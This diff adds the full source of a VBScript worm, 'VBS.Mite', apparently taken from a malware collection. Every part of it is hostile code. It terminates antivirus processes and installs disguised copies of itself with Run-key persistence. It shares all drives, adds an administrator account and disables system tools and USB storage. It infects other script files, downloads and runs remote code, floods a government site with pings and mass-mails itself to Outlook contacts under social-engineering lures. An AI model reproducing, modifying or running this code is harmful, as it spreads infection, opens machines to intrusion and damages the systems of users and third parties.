@@ -1,0 +1,305 @@
+' VBS.Mite by MYSTiQUE [rRlf] ver. 1.0
+on error resume next
+dim fso, myst, virus, language, Accessories
+Set myst = CreateObject("Wscript.Shell")
+set FSO=createobject("scripting.filesystemobject")
+Set fl = fso.OpenTextFile(WScript.ScriptFullName, 1)
+virus = fl.ReadAll					
+fl.Close
+
+
+CheckLang()
+sub CheckLang()
+If Month(Now()) = 12 And Day(Now()) = 31 Then
+myst.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\SM_AccessoriesName")
+if Accessories="Стандартные" then 
+fso.deletefile wscript.scriptfullname
+end if
+end if
+end sub
+
+
+Task()
+Sub Task()
+myst.run"taskkill /f /im drweb32w.exe",0
+myst.run"taskkill /f /im drwebupw.exe",0
+myst.run"taskkill /f /im drwebwcl.exe",0
+myst.run"taskkill /f /im drweb386.exe",0
+myst.run"taskkill /f /im SCAN.EXE",0 
+myst.run"taskkill /f /im NOD32.EXE",0
+myst.run"taskkill /f /im NAVWNT.EXE",0
+myst.run"taskkill /f /im NAVW32.EXE",0
+myst.run"taskkill /f /im ZONEALARM.EXE",0 
+myst.run"taskkill /f /im TASKMON.EXE",0
+myst.run"taskkill /f /im REGEDIT.EXE",0
+myst.run"taskkill /f /im REGEDIT32.EXE",0
+myst.run"taskkill /f /im OUTPOST.EXE",0 
+myst.run"taskkill /f /im NPROTECT.EXE",0
+myst.run"taskkill /f /im SPIDER.VXD",0
+myst.run"taskkill /f /im AVPM.EXE",0
+myst.run"taskkill /f /im Norton.EXE",0 
+myst.run"taskkill /f /im Mcafee.EXE",0
+myst.run"taskkill /f /im Sophos.exe",0
+myst.run"taskkill /f /im F-PROT.EXE",0
+End Sub
+
+'Thanks to [K]Alamar for antideletion function
+AntiDeletion()
+Sub AntiDeletion()
+Set fso = CreateObject("scripting.filesystemobject")
+Set fuck = fso.opentextfile(wscript.scriptfullname, 1)
+vir = fuck.readall
+fuck.Close
+Do
+If Not (fso.fileexists(wscript.scriptfullname)) Then
+Set fuck = fso.createtextfile(wscript.scriptfullname, True)
+fuck.write vir
+fuck.Close
+End If
+Loop
+End Sub
+
+InstalltoWindows()
+Sub InstalltoWindows()
+fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(0)+"\DrWeb.vbs"
+Set f = fso.GetFile(fso.GetSpecialFolder(0)&"\DrWeb.vbs")
+f.attributes = f.attributes + 2
+myst.regwrite"HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SPIDERNT",fso.GetSpecialFolder(0)+"\DrWeb.vbs"
+End sub
+InstalltoSystem()
+Sub InstalltoSystem()
+fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(1)+"\DrWebUpdate.vbs"
+Set f = fso.GetFile(fso.GetSpecialFolder(1)&"\DrWebUpdate.vbs")
+f.attributes = f.attributes + 2
+myst.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Regedit",fso.GetSpecialFolder(1)+"\DrWebUpdate.vbs"
+End sub
+InstalltoSystem2()
+Sub InstalltoSystem2()
+fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(1)+"\Backup.vbs"
+Set f = fso.GetFile(fso.GetSpecialFolder(1)&"\Backup.vbs")
+f.attributes = f.attributes + 2
+myst.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Regedit",fso.GetSpecialFolder(1)+"\Backup.vbs"
+
+End Sub
+InstalltoTemp()
+Sub InstalltoTemp()
+fso.copyfile wscript.scriptfullname,fso.GetSpecialFolder(2)+"\Ctfmon.vbs"
+Set f = fso.GetFile(fso.GetSpecialFolder(2)&"\Ctfmon.vbs")
+f.attributes = f.attributes + 2
+myst.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Ctfmon",fso.GetSpecialFolder(2)+"\Ctfmon.vbs"
+End sub
+
+OpenDriVe()
+Sub OpenDriVe()
+myst.run"net share f=f:\",0
+myst.run"net share c=c:\",0
+myst.run"net share d=d:\",0
+myst.run"net share e=e:\",0
+myst.run"net share g=g:\",0
+myst.run"net share h=h:\",0
+myst.run"net share i=i:\",0
+myst.run"net share j=j:\",0
+myst.run"net share k=k:\",0
+myst.run"net share l=l:\",0
+myst.run"net share m=m:\",0
+myst.run"net share n=n:\",0
+myst.run"net share o=o:\",0
+myst.run"net share p=p:\",0
+myst.run"net share q=q:\",0
+myst.run"net share r=r:\",0
+myst.run"net share s=s:\",0
+myst.run"net share t=t:\",0
+myst.run"net share u=u:\",0
+myst.run"net share v=v:\",0
+myst.run"net share w=w:\",0
+myst.run"net share x=x:\",0
+myst.run"net share y=y:\",0
+myst.run"net share z=z:\",0
+myst.regwrite"HKEY_CLASSES_ROOT\Network\SharingHandler\",""
+End sub
+NoDanger()
+Sub NoDanger()
+myst.regwrite"HKLM\SOFTWARE\Microsoft\Internet Explorer\main\FeatureControl\Feature_LocalMachine_Lockdown\IExplorer","0","REG_DWORD"
+End sub
+NewAdmin()
+Sub NewAdmin()
+myst.run"net user Administrator MYSTiQUE /add",0
+myst.run"net localgroup administrators /add admin",0
+End Sub
+msT()
+Sub msT()
+myst.regwrite "HKCU\software\TheMite\", "VBS.Mite by MYSTiQUE [rRlf]"
+End Sub
+
+NetworkSpreading()
+Sub NetworkSpreading(FileName)
+On Error Resume Next
+Set fso=CreateObject("Scripting.FileSystemObject")
+Set Network = CreateObject("WScript.Network")
+Set Shares = Network.EnumNetworkDrives
+Set Wormmm = fso.GetFile(WScript.ScriptFullName)
+Wormmm.Copy(fso.GetSpecialFolder(0)&"\NetWork.txt.vbs")
+
+If Shares.Count > 0 Then
+Set FSO = CreateObject("Scripting.FileSystemObject")
+For Counter1 = 0 To Shares.Count - 1
+If Shares.Item(Counter1) <> "" Then FSO.CopyFile Wormmm, FSO.BuildPath(Shares.Item(Counter1), FileName)
+Next
+Set FSO = Nothing
+End If
+Set Shares = Nothing
+Set Network = Nothing
+End Sub
+
+
+
+
+Folder()
+Sub Folder()
+On Error Resume Next
+Set myst = CreateObject("Wscript.Shell")
+Set FSO = CreateObject("Scripting.FileSystemObject")
+Desktop =  myst.SpecialFolders("AllUsersDesktop")
+StartMenu = myst.SpecialFolders("AllUsersStartMenu")
+Programs = myst.SpecialFolders("AllUsersPrograms")
+StartUp = myst.SpecialFolders("AllUsersStartUp")
+MyDocuments = myst.SpecialFolders("MyDocumets")
+SendTo = myst.SpecialFolders("SendTo")
+Recent = myst.SpecialFolders("Recent")
+Favorites = myst.SpecialFolders("Favorites")
+Templates = myst.SpecialFolders("Templates")
+fso.copyfile Wscript.ScriptFullName, SendTo & "\re; answer me.vbs"
+fso.copyfile Wscript.ScriptFullName, StartMenu & "\win log.vbs"
+fso.copyfile Wscript.ScriptFullName, Recent & "\fss vs. cia.vbs"
+fso.copyfile Wscript.ScriptFullName, Favorites & "\AdminPages whitehouse.lnk.          vbs"
+fso.copyfile Wscript.ScriptFullName, Dektop & "\open Me.vbs"
+fso.copyfile wscript.scriptfullname, Templates & "\Word.vbs"
+fso.copyfile Wscript.Scriptfullname, Mydocuments & "\ReadMe.txt.vbs"
+fso.copyfile wscript.scriptfullname, Startup & "\kernel32.dll.vbs"
+Set f = fso.GetFile(fso.GetSpecialFolder(0)&"\kernel32.dll.vbs")
+f.attributes = f.attributes + 2
+fso.copyfile wscript.scriptfullname, Programs & "\drweb.vbs"
+end sub
+
+payload()
+sub payload()
+if day(now())=20 then
+myst.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\disabletaskmgr","1","REG_DWORD"
+myst.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\disableregistrytools","1","REG_DWORD"
+myst.regwrite "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}\LocalizedString","Fucking Toilet"
+myst.regwrite"HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR\Start","4","REG_DWORD"
+myst.regwrite"HKLM\SOFTWARE\Microsoft\Internet Explorer\main\FeatureControl\Feature_LocalMachine_Lockdown\IExplorer","0","REG_DWORD"
+end if
+end sub
+
+infectfile()
+Sub infectfile()
+On Error Resume Next
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set drv = fso.Drives
+For Each d In drv						
+If d.DriveType = 2 Or d.DriveType = 3 Then
+list(d.path&"\")
+End If
+Next
+End Sub
+
+Sub list(doss)
+On Error Resume Next
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set fold = fso.GetFolder(doss)
+Set yebjp = fold.SubFolders
+For Each f1 In yebjp						
+infect(f1.Path)
+list(f1.Path)
+Next
+End Sub
+
+Sub infect(doss)
+On Error Resume Next
+Set mst = CreateObject("Scripting.FileSystemObject")
+Set lxxj = mst.GetFolder(doss)
+Set fc = lxxj.Files
+For Each f1 In fc						
+ext = fso.GetExtensionName(f1.Path)
+ext = lCase(ext)
+If (ext = "vbs") or (ext = "vbe") or (ext = "vdb") Then
+    Set cot = fso.OpenTextFile(f1.Path, 1, False)
+    If cot.ReadLine <> "'ohuenno pizdatiy virus" Then				
+    cot.Close
+    Set cot = fso.OpenTextFile(f1.Path, 1, False)
+    vbsorg = cot.ReadAll()
+    cot.Close
+    Set inf = fso.OpenTextFile(f1.Path, 2, True)
+    inf.WriteLine virus						
+    inf.WriteLine ""
+    inf.WriteLine (vbsorg)					
+    inf.Close
+End if
+End If
+Next
+End Sub
+
+
+update()
+Sub update()
+Dim Inet, myst
+Dim DoWnLoAd
+Set Inet = CreateObject("InetCtls.Inet")
+Inet.RequestTimeOut = 30
+DoWnLoAd = Inet.OpenURL("http://vx.netlux.org/rrlf/mite update.txt")
+set fso = createobject("scripting.filesystemobject")
+set f = fso.CreateTextFile("c:\update.vbs")
+f.write DoWnLoAd
+f.close
+Set myst = CreateObject("WScript.Shell")
+myst.run ("c:\update.vbs")
+end sub
+dos()
+sub dos()
+If Month(Now()) = 5 And Day(Now()) = 9 Then
+myst.run (fso.GetSpecialFolder(1)+"\ping.exe -t -l 10000 www.whitehouse.gov"),0
+End if
+end sub
+CheckLang()
+
+Email()
+Sub Email()
+Set O=CreateObject("Outlook.Application")
+Set mapi=O.GetNameSpace("MAPI")
+For Each AL In mapi.AddressLists
+If AL.AddressEntries.Count <> 0 Then
+For AddListCount = 1 To AL.AddressEntries.Count
+Set ALE = AL.AddressEntries(AddListCount)
+Set go = O.CreateItem(0)
+go.To = ALE.Address
+Randomize
+num=Int((3*Rnd)+1)
+Set c = f.GetFile(WScript.ScriptFullName)
+
+If num = 1 then
+c.Copy(fso.GetSpecialFolder(0)&"\Free porn.txt.vbs")
+go.Subject = "New free porn !"
+go.Body = "Look at this "
+go.Attachments.Add f.BuildPath(f.GetSpecialfolder(0),"Free porn.txt.vbs")
+
+elseif num = 2 then
+c.Copy(fso.GetSpecialFolder(0)&"\Free Key (DrWeb and KAV).vbs")
+go.Subject = "Free Key"
+go.Body = "Free Key (DrWeb and KAV)"
+go.Attachments.Add f.BuildPath(f.GetSpecialfolder(0),"Free Key (DrWeb and KAV).vbs")
+
+elseif num = 3 then
+c.Copy(fso.GetSpecialFolder(0)&"\viruslist.txt.vbs")
+go.Subject = "News from www.viruslist.com"
+go.Body = "Read this news"
+go.Attachments.Add f.BuildPath(f.GetSpecialfolder(0),"viruslist.txt.vbs")
+End If
+If go.To <> "" Then
+go.Send
+End If
+Next
+End If
+Next
+End Sub
+
